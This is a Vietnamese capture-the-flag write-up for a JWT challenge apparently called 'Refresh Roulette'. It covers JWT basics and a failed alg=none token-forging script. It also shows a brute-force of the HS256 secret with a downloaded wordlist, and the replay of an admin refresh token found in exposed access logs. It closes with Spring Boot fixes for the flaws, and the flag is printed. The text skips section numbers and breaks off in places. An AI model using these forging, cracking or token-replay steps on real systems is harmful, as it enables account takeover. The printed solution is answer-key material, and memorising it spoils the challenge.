Phần 0 — Kiến thức nền cần có trước khi bắt đầu

0.1 — JWT là gì?

JWT (JSON Web Token) là một chuỗi gồm 3 phần nối nhau bằng dấu chấm:

xxxxx.yyyyy.zzzzz
↑header    ↑payload   ↑chữ ký

Cả header và payload chỉ là JSON được mã hóa Base64URL — không phải mã hóa bí mật, ai cũng decode ngược được. Phần duy nhất đảm bảo tính toàn vẹn là chữ ký (phần 3): server tạo bằng cách lấy HMAC-SHA256(header.payload, secret). Không biết secret thì không thể sửa payload mà chữ ký vẫn hợp lệ.

✔ Tự verify bằng tay: lấy phần giữa của bất kỳ JWT nào, bỏ qua chữ ký, decode:

echo "eyJzdWIiOiIxMjM0NTY3ODkwIn0" | base64 -d 2>/dev/null; echo

(Base64URL thiếu padding nên có thể cần thêm = vào cuối. Hoặc dùng python3 -c "import base64;print(base64.urlsafe_b64decode('...'))".)
☕ Tương đồng Spring Boot

Trong Spring Boot bạn thường tạo JWT bằng thư viện jjwt hoặc java-jwt (Auth0):

String token = Jwts.builder()
    .setSubject(user.getId())
    .claim("email", user.getEmail())
    .claim("role", user.getRole())
    .signWith(Keys.hmacShaKeyFor(secret))   // HS256 — secret là 1 chuỗi byte
    .compact();

Challenge này dùng đúng kiến trúc đó, nhưng cấu hình yếu ở chỗ khác — ta sẽ thấy.

0.2 — Access token vs Refresh token

Luồng chuẩn: login → nhận cả 2 → access hết hạn → gọi refresh → nhận access mới (và refresh token mới nếu hệ thống có rotation).

⚠️ Chú ý @RequestParam — tham số đi qua URL query. Chi tiết lỗi này ở Phần 5.

0.3 — Cookie và "debug cookie"

Cookie là dữ liệu trình duyệt tự gửi kèm mọi request tới domain. Server có thể dùng cookie để phân quyền. Nếu developer để lại một cookie cứng kiểu "set cookie này là được vào trang debug", đó là cửa hậu (backdoor).

Hai thuộc tính quan trọng thường gặp:

  • HttpOnly: JS không đọc được (chống XSS đánh cắp cookie) — token trong challenge này không set HttpOnly (để JS frontend đọc được), đó cũng là một điểm yếu.
  • SameSite=Lax: trình duyệt không gửi cookie khi request đến từ site khác (chống CSRF một phần).

0.4 — Access log là gì và tại sao nó nguy hiểm?

Mọi web server đều ghi lại từng request: thời gian, method, URL đầy đủ kèm query string, status code. Trong Spring Boot/Tomcat bạn có thể bật bằng server.tomcat.accesslog.enabled=true, hoặc một Filter ghi log, hoặc AOP log mọi request.

⚠️ Hệ quả cốt lõi của bài này: nếu credential đi qua URL query (?refresh_token=eyJ...), nó sẽ nằm lì trong log dưới dạng plaintext. Ai đọc được log = ai đó có credential. Đây là lý do chuẩn bảo mật cấm đặt secret lên URL.

Bước 1.5 — Dò đường dẫn có chọn lọc: phát hiện /logs

App không hề liên kết tới /logs ở bất kỳ đâu — không có manh mối trực tiếp. Nhưng ta có hai gợi ý gián tiếp để chọn từ khóa thay vì dò mù:

Phần 2 — Các hướng tấn công trực diện (đều thất bại, và cách verify từng cái)

Trước khi đi đường vòng, ta phải chứng minh đường tắt không đi được. Mỗi hướng dưới đây đều có kết quả verify rõ ràng — đọc kỹ để hiểu vì sao cuối cùng phải đi ăn cắp token.

Bước 2.1 — Đăng ký tài khoản, giải mã token của chính mình

# Đăng ký — server trả ngay cặp token
curl -s -i -X POST http://154.57.164.71:36575/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"email":"hoang.test.2026@example.com","password":"Test1234!x"}'

Response 200, body là JSON chứa access_token và refresh_token, đều dạng JWT. Decode phần giữa của access token (cắt chuỗi giữa 2 dấu chấm, base64-decode):

{
  "sub": "0d0628fb-5d16-4fc4-88c2-e96934e332e3",   ← UUID user
  "email": "hoang.test.2026@example.com",
  "role": "user",                        ← quyền thường
  "type": "access",
  "iat": 1792680511, "exp": 1792680631   ← exp - iat = 120 giây
}
✔ Cách verify: (1) status phải là 200 và JSON có đủ 2 trường token (nếu trùng email đã đăng ký thì đổi email khác); (2) tự decode payload bằng lệnh ở mục 0.1, xác nhận role=user và type=access; (3) kiểm tra exp - iat bằng cách trừ 2 số — ra 120 → access token sống 2 phút. Mọi con số trong write-up phải tự verify lại được, không tin lời mô tả.

Bước 2.3 — Thử forge token bằng alg=none ❌

JWT hỗ trợ thuật toán none (không chữ ký). Nếu server tin tưởng header mà không verify, ta tự ký token admin giả:

# Tạo token: header {"alg":"none"}, payload role=admin, chữ ký rỗng
python3 - <<'EOF'
import base64, json, urllib.request
b64 = lambda d: base64.urlsafe_b64encode(d).decode().rstrip('=')
hdr = b64(json.dumps({"alg":"none","typ":"JWT"}).encode())
pld = b64(json.dumps({"sub":"0d0628fb-...","email":"...","role":"admin","type":"access","iat":1792680511,"exp":1992680631}).encode())
tok = f"{hdr}.{pld}."
req = urllib.request.Request("http://154.57.164.71:36575/profile/data",
    headers={"Authorization": f"Bearer {tok}"})
try:
    print(urllib.request.urlopen(req, timeout=15).read().decode())
except urllib.error.HTTPError as e:
    print("HTTP", e.code, e.read().decode()[:200])
EOF
✔ Cách verify kết quả thất bại: server trả HTTP 401 {"error":"jwt signature is required"}. → Hệ thống bắt buộc có chữ ký, không đánh lừa bằng alg=none được. Ghi nhận: hướng này đóng.

Bước 2.4 — Brute-force secret HS256 ❌

Nếu secret là chuỗi yếu/guess được, ta có thể tự ký token admin hợp lệ. Cách kiểm tra: với mỗi ứng viên key, tính HMAC-SHA256(header.payload, key) và so với chữ ký trong token thật:

# Tải wordlist secret JWT công khai (wallarm/jwt-secrets)
curl -s -o jwt.secrets.list \
  https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list

# Brute-force — token thật lấy từ bước 2.1
python3 - <<'EOF'
import base64, hmac, hashlib
token = "<ACCESS_TOKEN>"
msg, sig = token.rsplit('.', 1)
expected = base64.urlsafe_b64decode(sig + '=' * (-len(sig) % 4))
for line in open('jwt.secrets.list', errors='ignore'):
    key = line.strip()
    if not key or key.startswith('#'): continue
    mac = hmac.new(key.encode(), msg.encode(), hashlib.sha256).digest()
    if hmac.compare_digest(mac, expected):
        print("[+] FOUND:", key); break
else:
    print("[-] Không tìm thấy")
EOF
✔ Cách verify kết quả thất bại: chạy xuất [-] Không tìm thấy sau ~104.000 keys. → Secret là chuỗi tự tạo, không crack nhanh được (với HS256 đủ dài thì brute-force không khả thi). Ghi nhận: hướng forge token đóng hoàn toàn. Phải tìm token thật của admin — đề bài gợi ý "connect the scraps".

Bước 3.2 — Săn credential trong log

Log gồm nhiều dòng dạng:

[2026-10-22T14:32:34.617Z] INFO request completed method=GET url=/auth/refresh?refresh_token=eyJhbGciOi... <JWT DÀI> status=

Đây chính là hệ quả của lỗ hổng #1 (token trên URL query): admin đã từng làm mới token, và refresh token của họ bị ghi lại nguyên văn trong log. Sao chép chuỗi JWT đó, decode phần giữa:

{
  "sub": "e369326c-cb6d-4a04-9df4-7585c16d90b6",
  "email": "admin@corp.htb",      ← tài khoản admin!
  "role": "admin",               ← đúng thứ ta cần
  "type": "refresh",
  "iat": 1792679554,
  "exp": 1792765954           ← iat + 86400 = còn hạn tới hết ngày mai
}
✔ Cách verify từng mảnh:
1. Decode payload bằng lệnh base64 ở mục 0.1 → xác nhận role=admin, type=refresh.
2. Kiểm tra hạn sống: lấy exp - iat = 86400 giây = 24h; đối chiếu thời điểm hiện tại (lệnh date +%s) < exp → token còn dùng được.
3. Kiểm tra thật hay giả: gọi luôn endpoint refresh ở bước dưới — nếu server trả access token mới thì token thật 100% (server đã verify chữ ký thành công).
⚠️ Nếu bạn tự deploy lại challenge, mỗi lần chạy db.migrate() sẽ xóa dữ liệu cũ và log mới sẽ khác — token trong log của phiên bạn đang chơi mới có giá trị. Luôn dùng token từ log của phiên hiện tại.

Phần 5 — Root cause qua góc nhìn Spring Boot (ai code Java sẽ thấy quen)

Lỗi #1 — Refresh token trên URL query

☕ Code dạng bị sai (tương đồng với app challenge)
@GetMapping("/auth/refresh")
public TokenResponse refresh(@RequestParam String refreshToken) {   // ← lộ vào access log
    ...
}
✅ Cách sửa
// 1. Token đi qua POST body (không bao giờ nằm trong URL/log)
@PostMapping("/auth/refresh")
public TokenResponse refresh(@RequestBody @Valid RefreshRequest req) { ... }

// 2. Filter log request: che mọi tham số nhạy cảm trước khi ghi log
if (uri.contains("token") || uri.contains("password")) {
    log.info("method={} url={} [REDACTED]", method, uri.split("\\?")[0]);

Lỗi gốc (đúng tên flag) — Không rotate refresh token

✅ Rotation đúng chuẩn
// Mỗi lần refresh: vô hiệu token cũ, cấp token MỚI, phát hiện reuse thì thu hồi cả chuỗi
public TokenResponse refresh(String oldToken) {
    RefreshToken old = repo.find(oldToken).orElseThrow(InvalidTokenException::new);
    if (old.isUsed()) {   // ← chống replay — lỗi của challenge nằm ở đây
        repo.revokeFamily(old.getFamilyId());
        throw new InvalidTokenException();
    }
    old.markUsed();
    return issueNewPair(old.getFamilyId());
}

Challenge cho token sống 24h và dùng lại vô tội vạ → token "của hôm qua" vẫn mở được cửa hôm nay. Flag R3fr3sh_T0k3ns_Must_R0t4t3 chính là lời giải thích của tác giả.

Lỗi phụ — Token lưu trong cookie không HttpOnly

main.js đọc token trực tiếp từ document.cookie → cookie không set HttpOnly. Nếu app này có thêm lỗi XSS, token sẽ bị đánh cắp dễ dàng. Trong Spring Boot (khi dùng cookie thay vì header), nhớ: ResponseCookie.from("refresh_token", t).httpOnly(true).secure(true).sameSite("Strict").build().

Phần 6 — Bài học & checklist khi tự làm lại

  1. Đọc hết JS bundle trước khi tấn công. main.js cho bản đồ API, dev.js cho cookie debug — cả 2 đều nằm ngoài trang chủ.
  2. Phân biệt 403 và 404 khi dò đường dẫn. 403 = route tồn tại, đáng đầu tư thêm công sức.
  3. Kiểm chứng mọi giả thuyết trước khi bỏ: alg=none → đọc lỗi 401; crack secret → chạy wordlist đủ lớn. Không đoán.
  4. Credential trên URL = credential trong log. Áp dụng cho mọi tham số: token, session id, reset-password link.
  5. Refresh token phải rotate. Lộ token cũ không được phép mở phiên mới.
  6. Không để artifact dev/debug đi cùng production build. Kiểm tra cả /static/, source map (.js.map), endpoint actuator.
  7. Verify cuối cùng luôn là submit flag lên portal. Mọi bước trước đó chỉ là bằng chứng gián tiếp.

Flag trong bài đã xác minh thành công nhưng chưa nộp — bạn tự submit ở portal của challenge. Chúc mừng bạn đã clear Refresh Roulette! 🎉
